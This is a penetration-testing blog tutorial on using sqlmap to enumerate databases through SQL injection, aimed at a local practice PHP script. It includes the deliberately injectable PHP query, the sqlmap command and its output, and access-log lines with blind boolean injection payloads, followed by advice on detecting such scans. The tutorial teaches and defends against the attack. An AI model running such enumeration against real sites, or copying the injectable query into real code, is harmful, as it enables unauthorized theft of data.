---
title: "Enumeration with sqlmap"
description: "Using sqlmap to enumerate databases through a SQL injection, what enumeration means in a pen test, and how the attack looks in the server logs."
date: 2012-05-11
tags: [sql-injection, web, tooling]
---

[sqlmap](https://sqlmap.org/) is an open-source, free tool for automatic SQL injection and database takeover. I find it extremely useful for blind SQL injection, which is otherwise tedious to do by hand. This article covers just the enumeration function.

## What enumeration means

Enumeration is, broadly, an exact listing of all the elements of a set. In practical terms it means extracting all the data you need from some system. Examples:

- Fetching all databases, tables, and columns from a database (what we will demonstrate here)
- Listing all files on a filesystem via a local file disclosure vulnerability
- Enumerating a network and its devices
- Identifying user accounts on a system

Enumeration appears in almost every penetration test, though in different phases. Network enumeration usually happens during discovery and ties closely to fingerprinting.

## Enumerating databases with sqlmap

Always start with the manual. Reading the sqlmap docs under enumeration gives you these options:

- `--dbs` list databases
- `--tables` list tables
- `--columns` list columns
- `--users` list users
- `--passwords` list and crack DBMS passwords
- `--roles` list user roles
- `--privileges` list user privileges
- `--dump` dump table entries

### The vulnerable code

The target is a simple PHP script that looks up records by username. This is typical code seen all over the internet, hopefully with proper sanitization:

```php
$con = mysql_connect("localhost", "root", "password");
mysql_select_db("mysql", $con);
$result = mysql_query('SELECT user FROM user where User="' . $_GET['username'] . '"');
print_r(mysql_fetch_row($result));
mysql_close($con);
```

Line 3 is the vulnerability. It should be a prepared statement with proper filtering, preferably a whitelist of allowed values.

### Running sqlmap

With the code running on a webserver, enumerate the databases:

```
$ sqlmap --dbs -u http://localhost/sqlinjection/2.php?username=root

[INFO] testing connection to the target url
[INFO] GET parameter 'username' is dynamic
[INFO] GET parameter 'username' is double quoted string injectable with 0 parenthesis
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL >= 5.0.0
[INFO] fetching database names
available databases [4]:
[*] information_schema
[*] mutillidae
[*] mysql
[*] owasp10
```

`information_schema` and `mysql` are default MySQL databases; `mutillidae` and `owasp10` are the interesting ones.

## What it looks like in the logs

You can never be 100% secure, and if you ever respond to a SQL injection incident, the enumeration often leaves a cascading trail in the access logs. sqlmap's blind extraction is a giveaway, walking a value character by character with boolean conditions:

```
GET /sqlinjection/2.php?username=root HTTP/1.1" 200 238 "-" "sqlmap/0.6.4"
GET /sqlinjection/2.php?username=%27egxlj HTTP/1.1" 200 211
GET /sqlinjection/2.php?username=root%20AND%20670=670 HTTP/1.1" 200 211
GET /sqlinjection/2.php?username=root%22%20AND%20ORD(MID((SELECT%204%20FROM%20information_schema.TABLES%20LIMIT%200,1),1,1))%20>%2063%20AND%20%22AZxTN%22=%22AZxTN HTTP/1.1" 200 211
GET ...%20>%2031... 200 238
GET ...%20>%2047... 200 238
```

Those `ORD(MID(...)) > N` requests are a binary search over each character of the extracted value, which is the signature of automated blind injection. Watching the User-Agent (`sqlmap/...`) and this boolean-probing pattern in your logs is a reliable way to spot the activity.
